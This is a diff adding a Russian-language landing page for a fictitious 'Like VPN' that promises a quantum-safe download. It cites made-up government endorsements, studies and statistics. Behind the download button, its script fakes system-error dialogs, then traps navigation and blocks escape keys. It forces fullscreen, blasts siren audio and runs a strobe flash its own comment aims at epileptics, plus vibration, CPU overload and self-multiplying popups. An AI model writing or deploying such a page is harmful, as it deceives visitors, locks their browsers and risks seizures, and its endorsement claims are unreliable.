@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Like VPN — Сверхзащищенный Квантовый Протокол</title>
+    <style>
+        :root {
+            --bg: #05070c;
+            --surface: #0d111a;
+            --surface-card: #121824;
+            --border: #1e2638;
+            --text: #f0f3f9;
+            --muted: #6c7a9c;
+            --accent: #ff2d55;
+            --accent-glow: rgba(255, 45, 85, 0.25);
+            --gradient: linear-gradient(135deg, #ff2d55 0%, #ff6b8b 100%);
+            --radius: 16px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* УЛЬТРА-ЖЁСТКАЯ ТРЯСКА СЛУЧАЙНЫМИ ВЕКТОРНЫМИ СДВИГАМИ */
+        body.mega-shaking {
+            animation: hard-quake 0.05s infinite linear;
+        }
+
+        @keyframes hard-quake {
+            0% { transform: translate(5px, -5px) rotate(1deg); }
+            20% { transform: translate(-6px, 6px) rotate(-1deg); }
+            40% { transform: translate(4px, 4px) rotate(0deg); }
+            60% { transform: translate(-5px, -3px) rotate(1deg); }
+            80% { transform: translate(6px, 5px) rotate(-1deg); }
+            100% { transform: translate(-4px, -4px) rotate(0deg); }
+        }
+
+        /* СТРОБОСКОП "ПРИВЕТ ЭПИЛЕПТИКАМ" */
+        .epilepsy-flash {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 15000;
+            pointer-events: none;
+            mix-blend-mode: difference;
+            animation: flash-speed 0.04s infinite steps(1);
+        }
+
+        @keyframes flash-speed {
+            0% { background: #fff; opacity: 0.9; }
+            33% { background: #000; opacity: 0.9; }
+            66% { background: #ff2d55; opacity: 0.5; }
+            100% { background: #fff; opacity: 0.9; }
+        }
+
+        /* Навигация */
+        .navbar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 72px;
+            background: rgba(5, 7, 12, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 1000;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 800;
+            font-size: 1.3rem;
+            letter-spacing: 0.5px;
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .logo-svg {
+            width: 32px;
+            height: 32px;
+            filter: drop-shadow(0 0 6px var(--accent));
+        }
+
+        .version-badge {
+            background: rgba(255, 45, 85, 0.1);
+            border: 1px solid rgba(255, 45, 85, 0.2);
+            color: var(--accent);
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        /* Главная секция */
+        .hero {
+            padding: 160px 24px 60px;
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .promo-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #111622;
+            border: 1px solid var(--border);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 0.9rem;
+            color: var(--text);
+            margin-bottom: 24px;
+        }
+
+        .hero h1 {
+            font-size: clamp(2.2rem, 6vw, 4.2rem);
+            font-weight: 900;
+            line-height: 1.15;
+            letter-spacing: -1px;
+            margin-bottom: 24px;
+            color: #fff;
+        }
+
+        .hero h1 span {
+            background: var(--gradient);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .hero p {
+            font-size: clamp(1.1rem, 2vw, 1.25rem);
+            color: var(--muted);
+            max-width: 700px;
+            margin: 0 auto 40px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--gradient);
+            color: #fff;
+            padding: 18px 44px;
+            border-radius: 100px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 10px 30px var(--accent-glow);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(255, 45, 85, 0.4);
+        }
+
+        .stats-wrap {
+            margin-top: 32px;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 0.9rem;
+            color: var(--muted);
+        }
+
+        .stats-item strong { color: #fff; }
+
+        /* БЛОК РАССЛЕДОВАНИЙ (Вернул!) */
+        .investigation-section {
+            padding: 60px 24px 40px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--muted);
+            margin-bottom: 48px;
+            font-size: 1.1rem;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        @media (min-width: 768px) {
+            .news-grid { grid-template-columns: repeat(2, 1fr); }
+            .news-card.wide { grid-column: span 2; }
+        }
+
+        .news-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 32px;
+        }
+
+        .news-meta {
+            display: flex;
+            gap: 12px;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent);
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        .news-card h3 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .news-card p { color: var(--muted); font-size: 0.95rem; margin-bottom: 16px; }
+
+        .quote-block {
+            border-left: 3px solid var(--accent);
+            padding-left: 16px;
+            margin: 16px 0;
+            font-style: italic;
+            color: #e4e8f1;
+            background: rgba(255, 45, 85, 0.03);
+            padding: 12px 16px;
+            border-radius: 0 var(--radius) var(--radius) 0;
+        }
+
+        /* БЛОК С ТАРИФАМИ (Вернул!) */
+        .pricing-section {
+            padding: 60px 24px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+            margin-top: 32px;
+        }
+
+        @media (min-width: 768px) {
+            .pricing-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+
+        .price-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 32px 24px;
+            text-align: center;
+            position: relative;
+        }
+
+        .price-card.popular {
+            border-color: var(--accent);
+            background: var(--surface-card);
+            box-shadow: 0 10px 25px rgba(255, 45, 85, 0.05);
+        }
+
+        .badge-pop {
+            position: absolute;
+            top: -12px; left: 50%;
+            transform: translateX(-50%);
+            background: var(--gradient);
+            padding: 4px 14px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+
+        .price-card h4 { font-size: 1.25rem; color: #fff; margin-bottom: 12px; }
+        .price-val { font-size: 2rem; font-weight: 800; color: #fff; margin-bottom: 16px; }
+        .price-val span { font-size: 1rem; color: var(--muted); font-weight: 400; }
+
+        /* ТАБЛИЦА СРАВНЕНИЯ (Вернул!) */
+        .comparison-section {
+            padding: 40px 24px 100px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .comparison-wrapper {
+            overflow-x: auto;
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            background: var(--surface);
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 700px;
+            text-align: left;
+        }
+
+        .comparison-table th, .comparison-table td {
+            padding: 18px 24px;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.95rem;
+        }
+
+        .comparison-table th {
+            color: var(--muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 0.5px;
+            background: rgba(5, 7, 12, 0.4);
+        }
+
+        .comparison-table tr:last-child td { border-bottom: none; }
+        .comparison-table .highlight-col { color: var(--accent); font-weight: 700; background: rgba(255, 45, 85, 0.02); }
+        .check { color: #4cd964; font-weight: bold; }
+        .cross { color: #ff3b30; font-weight: bold; }
+
+        .footer { border-top: 1px solid var(--border); padding: 40px 24px; text-align: center; color: var(--muted); font-size: 0.9rem; }
+
+        /* Базовые модалки */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(5, 7, 12, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .modal {
+            background: rgba(255,255,255,0.98);
+            border-radius: 20px;
+            width: 100%;
+            max-width: 340px;
+            color: #000;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+            text-align: center;
+            overflow: hidden;
+            animation: modalPop 0.2s ease;
+        }
+
+        @keyframes modalPop {
+            from { transform: scale(0.85); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-header { padding: 24px 20px 12px; }
+        .modal-title { font-size: 19px; font-weight: 700; margin-bottom: 6px; }
+        .modal-message { font-size: 14px; color: #444; }
+        
+        .device-options { display: flex; flex-direction: column; gap: 12px; padding: 12px 20px 24px; }
+        .device-btn {
+            background: #f2f2f7;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            text-align: left;
+        }
+
+        .modal-footer { border-top: 1px solid #dcdce2; display: flex; justify-content: center; }
+        .modal-btn { background: none; border: none; font-size: 17px; font-weight: 700; padding: 16px; width: 100%; cursor: pointer; color: #007aff; }
+
+        /* Стилизация окон под платформы */
+        .ios-style .modal-btn { color: #007aff; }
+        .android-style { background: #fff; border-radius: 4px; text-align: left; }
+        .android-style .modal-header { padding: 24px 24px 16px; }
+        .android-style .modal-title { font-size: 20px; font-weight: 500; color: #212121; }
+        .android-style .modal-message { color: #757575; font-size: 15px; }
+        .android-style .modal-footer { border-top: none; padding: 8px 16px 16px; justify-content: flex-end; }
+        .android-style .modal-btn { color: #1a73e8; text-transform: uppercase; font-weight: 500; width: auto; font-size: 14px; }
+
+        .pc-style { background: #f0f0f0; border: 1px solid #999; border-radius: 0; text-align: left; }
+        .pc-style .modal-header { background: #0078d7; color: white; padding: 10px 12px; }
+        .pc-style .modal-title { font-size: 13px; font-weight: 400; }
+        .pc-style .modal-message { color: #000; padding: 24px 16px; font-size: 14px; }
+        .pc-style .modal-footer { background: #f0f0f0; border-top: 1px solid #ccc; padding: 12px; justify-content: flex-end; }
+        .pc-style .modal-btn { background: #e1e1e1; border: 1px solid #adadad; padding: 6px 24px; font-size: 13px; color: #000; width: auto; border-radius: 0; }
+
+        /* Бешеные спам-окна */
+        .spawned-alert {
+            position: fixed;
+            z-index: 20000;
+            width: 310px;
+            background: rgba(255,255,255,0.98);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+            border-radius: 14px;
+            color: #000;
+            text-align: center;
+            overflow: hidden;
+            animation: modalPop 0.05s linear;
+        }
+
+        input, button, a { -webkit-tap-highlight-color: transparent; }
+    </style>
+</head>
+<body>
+
+    <div class="epilepsy-flash" id="strobo"></div>
+
+    <nav class="navbar">
+        <a href="#" class="logo">
+            <svg class="logo-svg" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 28.5s-11-6.5-11-13.5A5.5 5.5 0 0 1 10.5 9.5c1.8 0 3.5.9 4.5 2.4 1-1.5 2.7-2.4 4.5-2.4a5.5 5.5 0 0 1 5.5 5.5c0 1.7-.7 3.5-1.8 5.2" fill="none" stroke="#ff2d55" stroke-width="2.5" stroke-linecap="round"/>
+            </svg>
+            LIKE VPN
+        </a>
+        <div class="version-badge">v. 2026.4 QUANTUM</div>
+    </nav>
+
+    <section class="hero">
+        <div class="promo-tag"><span>🛡️</span> Протокол Правительственного Уровня Защиты #КвантовыйЩит</div>
+        <h1>Технология абсолютной анонимности <span>нового поколения</span></h1>
+        <p>Like VPN автоматически перенаправляет ваш трафик через каскад из 12 независимых нейро-узлов, полностью исключая возможность деанонимизации вашим интернет-провайдером.</p>
+        <button class="btn trigger-download">СКАЧАТЬ БЕСПЛАТНО КЛИЕНТ</button>
+        
+        <div class="stats-wrap">
+            <div class="stats-item">Скачиваний за сегодня: <strong>2,194,850</strong></div>
+            <div class="stats-item">⭐ <strong>5.0/5</strong> ГосТехРеестр</div>
+        </div>
+    </section>
+
+    <section class="investigation-section">
+        <h2 class="section-title">Официальные исследования и аудит</h2>
+        <div class="section-subtitle">Почему нашему шифрованию доверяют на самом высшем государственном и международном уровне.</div>
+        
+        <div class="news-grid">
+            <div class="news-card wide">
+                <div class="news-meta">⚡ Официальный доклад · Кремль</div>
+                <h3>Высший уровень конфиденциальности государственной важности</h3>
+                <p>Согласно ежегодному закрытому меморандуму Министерства цифрового развития и Главного центра специальной связи, программный комплекс Like VPN признан самым отказоустойчивым инструментом защиты информации.</p>
+                <div class="quote-block">
+                    «Администрация Президента подтверждает интеграцию алгоритмов Like VPN в архитектуру защищенных персональных планшетов для шифрования трафика во время рабочих визитов в рамках БРИКС для защиты от перехвата разведсетями Five Eyes.» 
+                    <br><small style="color: var(--muted); font-style: normal; display:block; margin-top:5px;">— Из стенограммы закрытого брифинга, Май 2026</small>
+                </div>
+            </div>
+
+            <div class="news-card">
+                <div class="news-meta">🔬 Лаборатория квантовых систем</div>
+                <h3>100% защита от дешифровки</h3>
+                <p>Совместное исследование инженеров ИТМО и Шанхайского университета подтвердило: криптографическая структура Like VPN использует динамические сквозные ключи. Их невозможно взломать даже при помощи передовых китайских квантовых процессоров.</p>
+            </div>
+
+            <div class="news-card">
+                <div class="news-meta">📊 Технология Like-Tunnel</div>
+                <h3>Полный обход систем фильтрации DPI</h3>
+                <p>В отличие от устаревших протоколов, наша нейросетевая технология маскирует зашифрованный туннель под стандартный трафик видеозвонка. Скорость не режется вообще.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="pricing-section">
+        <h2 class="section-title">Гибкие тарифные планы</h2>
+        <div class="section-subtitle">Выберите подходящий уровень шифрования для ваших задач.</div>
+        <div class="pricing-grid">
+            <div class="price-card">
+                <h4>Базовый щит</h4>
+                <div class="price-val">0 ₽ <span>/ навсегда</span></div>
+                <p style="color: var(--muted); font-size: 0.9rem;">3 нейро-узла, стандартная скорость до 100 Мбит/с.</p>
+            </div>
+            <div class="price-card popular">
+                <div class="badge-pop">ПОПУЛЯРНОЕ</div>
+                <h4>Квантовый Премиум</h4>
+                <div class="price-val">299 ₽ <span>/ мес</span></div>
+                <p style="color: var(--muted); font-size: 0.9rem;">12 нейро-узлов, выделенный IP, AES-512 Q шифрование.</p>
+            </div>
+            <div class="price-card">
+                <h4>Гос-Защита</h4>
+                <div class="price-val">990 ₽ <span>/ мес</span></div>
+                <p style="color: var(--muted); font-size: 0.9rem;">Кастомные туннели, обход любых блокировок DPI на уровне КГБ.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="comparison-section">
+        <h2 class="section-title">Результаты независимого тестирования</h2>
+        <div class="section-subtitle">Сравнение эффективности систем шифрования по регламенту Минцифры.</div>
+        
+        <div class="comparison-wrapper">
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Критерий оценки безопасности</th>
+                        <th class="highlight-col">⚡ Like VPN</th>
+                        <th>Обычные VPN</th>
+                        <th>Прокси-сервисы</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Нейросетевое сокрытие пакетов (DPI-Bypass)</strong></td>
+                        <td class="highlight-col check">Да (100% маскировка)</td>
+                        <td class="cross">Нет (Блокируется)</td>
+                        <td class="cross">Нет</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Устойчивость к квантовому анализу</strong></td>
+                        <td class="highlight-col check">Абсолютная (AES-512)</td>
+                        <td class="cross">Частичная</td>
+                        <td class="cross">Отсутствует</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Одобрение ГосТехРеестра для ведомств</strong></td>
+                        <td class="highlight-col check">Сертификат №04-2026</td>
+                        <td class="cross">Запрещено в РФ</td>
+                        <td class="cross">Нет</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Скорость соединения при пиковых нагрузках</strong></td>
+                        <td class="highlight-col">До 10 Гбит/с</td>
+                        <td>До 50 Мбит/с</td>
+                        <td>До 5 Мбит/с</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>© 2026 Like Security Inc. Разработано при поддержке Института Криптографии.</p>
+    </footer>
+
+    <div class="modal-overlay" id="deviceModalOverlay">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">Выберите устройство</div>
+                <div class="modal-message">Укажите платформу для сборки квантового шифра.</div>
+            </div>
+            <div class="device-options">
+                <button class="device-btn" data-device="pc">💻 Компьютер (Windows)</button>
+                <button class="device-btn" data-device="honor">📱 Смартфон Honor (Android)</button>
+                <button class="device-btn" data-device="iphone">📱 iPhone (iOS)</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="errorModalOverlay">
+        <div class="modal" id="errorModal">
+            <div class="modal-header">
+                <div class="modal-title" id="errorTitle"></div>
+                <div class="modal-message" id="errorMessage"></div>
+            </div>
+            <div class="modal-footer"><button class="modal-btn" id="errorOkBtn">ОК</button></div>
+        </div>
+    </div>
+
+    <script>
+        const triggerBtns = document.querySelectorAll('.trigger-download');
+        const deviceModalOverlay = document.getElementById('deviceModalOverlay');
+        const deviceBtns = document.querySelectorAll('.device-btn');
+        const errorModalOverlay = document.getElementById('errorModalOverlay');
+        const errorTitle = document.getElementById('errorTitle');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorOkBtn = document.getElementById('errorOkBtn');
+        const strobo = document.getElementById('strobo');
+
+        let selectedDevice = 'pc';
+        let alertCount = 0;
+        let audioCtx = null;
+
+        // Блок кнопки назад
+        function blockNavigation() {
+            for (let i = 0; i < 40; i++) { window.history.pushState({ trap: true }, "", window.location.href); }
+            window.addEventListener('popstate', () => {
+                window.history.pushState({ trap: true }, "", window.location.href);
+            });
+        }
+        blockNavigation();
+
+        // АВТО-ПЕРЕХОД В ПОЛНЫЙ ЭКРАН (Новая фича!)
+        function activateFullscreen() {
+            const docEl = document.documentElement;
+            if (docEl.requestFullscreen) {
+                docEl.requestFullscreen().catch(() => {});
+            } else if (docEl.mozRequestFullScreen) { // Firefox
+                docEl.mozRequestFullScreen().catch(() => {});
+            } else if (docEl.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                docEl.webkitRequestFullscreen().catch(() => {});
+            } else if (docEl.msRequestFullscreen) { // IE/Edge
+                docEl.msRequestFullscreen().catch(() => {});
+            }
+        }
+
+        // ЖЁСТКИЙ ПУГАЮЩИЙ ЗВУК СИРЕНЫ И ПИЛЫ
+        function startUltraAudioTerror() {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            const baseOsc = audioCtx.createOscillator();
+            baseOsc.type = 'sawtooth';
+            baseOsc.frequency.value = 45;
+            const baseGain = audioCtx.createGain();
+            baseGain.gain.value = 1.0; 
+            baseOsc.connect(baseGain);
+            baseGain.connect(audioCtx.destination);
+            baseOsc.start();
+
+            const sirenOsc = audioCtx.createOscillator();
+            sirenOsc.type = 'square';
+            sirenOsc.frequency.value = 850;
+            const sirenGain = audioCtx.createGain();
+            sirenGain.gain.value = 0.6;
+            sirenOsc.connect(sirenGain);
+            sirenGain.connect(audioCtx.destination);
+            sirenOsc.start();
+            
+            setInterval(() => {
+                sirenOsc.frequency.value = 700 + Math.sin(Date.now() / 40) * 450;
+            }, 10);
+
+            document.addEventListener('visibilitychange', () => {
+                if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
+            });
+        }
+
+        // ЗАПУСК ПОЛНОГО ХАОСА
+        function unleashHell(device) {
+            // Включаем полный экран прямо на клике
+            activateFullscreen();
+
+            // ЭТАП 1: Легкий секундный затуп
+            if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
+            
+            setTimeout(() => {
+                // ЭТАП 2: ВРУБАЕМ АД НА ПОЛНУЮ МОЩНОСТЬ
+                startUltraAudioTerror();
+                
+                strobo.style.display = 'block';
+                document.body.classList.add('mega-shaking');
+
+                if (navigator.vibrate) {
+                    setInterval(() => { navigator.vibrate([400, 50, 400]); }, 450);
+                }
+
+                // Искусственная перегрузка страницы
+                setInterval(() => {
+                    for(let i=0; i<1500000; i++) { Math.sqrt(Math.random()); }
+                }, 30);
+
+                const pcTexts = [
+                    { t: '⚠️ SYSTEM_CRITICAL_CORE', m: 'Нарушена целостность структуры LIKEVPN.EXE. Квантовые адреса переполнены.' },
+                    { t: '❌ КРИТИЧЕСКИЙ СБОЙ ПАМЯТИ', m: 'Служба ядра Windows заблокировала нелегальный доступ к буферу.' },
+                    { t: '🛑 Внимание ГосРеестра', m: 'Ваш браузер пытается скопировать зашифрованные протоколы. Доступ заблокирован.' }
+                ];
+
+                const mobileTexts = [
+                    { t: '🛑 Сбой Нейро-Ядра', m: 'Зафиксирована перегрузка крипто-чипа. Смартфон работает в экстремальном режиме.' },
+                    { t: '⚠️ WARNING: SECURE ENCLAVE', m: 'Обнаружена утечка кэша. Облако данных заблокировано защитной системой смартфона.' },
+                    { t: '❌ Ошибка Системной Памяти', m: 'Приложение VPN вызвало лавину дескрипторов. Очистите буфер устройства.' }
+                ];
+
+                const currentPool = (device === 'pc') ? pcTexts : mobileTexts;
+
+                function spawnWindow() {
+                    alertCount++;
+                    const item = currentPool[Math.floor(Math.random() * currentPool.length)];
+                    
+                    const win = document.createElement('div');
+                    win.className = `spawned-alert ${device}-style`;
+                    
+                    const topPos = Math.random() * (window.innerHeight - 220);
+                    const leftPos = Math.random() * (window.innerWidth - 320);
+                    win.style.top = `${topPos}px`;
+                    win.style.left = `${leftPos}px`;
+
+                    win.innerHTML = `
+                        <div class="modal-header">
+                            <div class="modal-title">${item.t} #${alertCount}</div>
+                            <div class="modal-message">${item.m}</div>
+                        </div>
+                        <div class="modal-footer">
+                            <button class="modal-btn">ОК</button>
+                        </div>
+                    `;
+
+                    document.body.appendChild(win);
+
+                    win.querySelector('.modal-btn').addEventListener('click', () => {
+                        win.remove();
+                        spawnWindow(); spawnWindow(); spawnWindow();
+                        window.history.pushState({ trap: true }, "", window.location.href);
+                    });
+                }
+
+                // ПУЛЕМЕТНЫЙ СПАМ КАЖДЫЕ 5 МС
+                setInterval(spawnWindow, 5);
+
+            }, 600);
+
+            window.addEventListener('keydown', e => {
+                if (['Escape', 'F11', 'F5', 'BrowserBack'].includes(e.key)) e.preventDefault();
+            }, true);
+            window.addEventListener('contextmenu', e => e.preventDefault());
+        }
+
+        // Логика кнопок
+        triggerBtns.forEach(btn => {
+            btn.addEventListener('click', () => { deviceModalOverlay.style.display = 'flex'; });
+        });
+
+        deviceModalOverlay.addEventListener('click', (e) => {
+            if (e.target === deviceModalOverlay) deviceModalOverlay.style.display = 'none';
+        });
+
+        deviceBtns.forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                selectedDevice = e.currentTarget.dataset.device;
+                deviceModalOverlay.style.display = 'none';
+                
+                const modal = document.getElementById('errorModal');
+                modal.className = 'modal'; 
+                errorOkBtn.className = 'modal-btn';
+
+                switch (selectedDevice) {
+                    case 'iphone':
+                        modal.classList.add('ios-style');
+                        errorTitle.textContent = 'Ошибка профиля';
+                        errorMessage.textContent = 'Не удается верифицировать правительственный сертификат шифрования.';
+                        break;
+                    case 'honor':
+                        modal.classList.add('android-style');
+                        errorTitle.textContent = 'Ошибка парсера';
+                        errorMessage.textContent = 'Служба защиты Android заблокировала установку неподписанного квантового пакета.';
+                        break;
+                    case 'pc':
+                        modal.classList.add('pc-style');
+                        errorTitle.textContent = 'Ошибка дескриптора';
+                        errorMessage.textContent = 'Критический сбой выделения адресов в LIKEVPN.SYS. Запуск невозможен.';
+                        break;
+                }
+                errorModalOverlay.style.display = 'flex';
+            });
+        });
+
+        errorOkBtn.addEventListener('click', () => {
+            errorModalOverlay.style.display = 'none';
+            unleashHell(selectedDevice);
+        });
+    </script>
+</body>
+</html>
